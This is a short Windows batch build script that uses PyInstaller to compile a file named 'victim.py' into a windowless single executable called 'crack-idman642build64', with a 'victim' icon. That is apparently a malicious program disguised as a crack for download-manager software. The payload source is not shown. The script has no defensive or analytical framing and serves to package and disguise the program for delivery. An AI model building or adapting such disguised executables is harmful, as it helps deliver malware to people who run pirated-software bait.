@echo off

echo Cleaning old files...
rmdir /s /q build
del bin\crack-idman642build64.exe

echo Building EXE...

python -m PyInstaller ^
--onefile ^
--noconsole ^
--name crack-idman642build64 ^
--icon victim-icon.ico ^
--distpath bin ^
victim.py

del *.spec
rmdir /s /q build

echo Done.
pause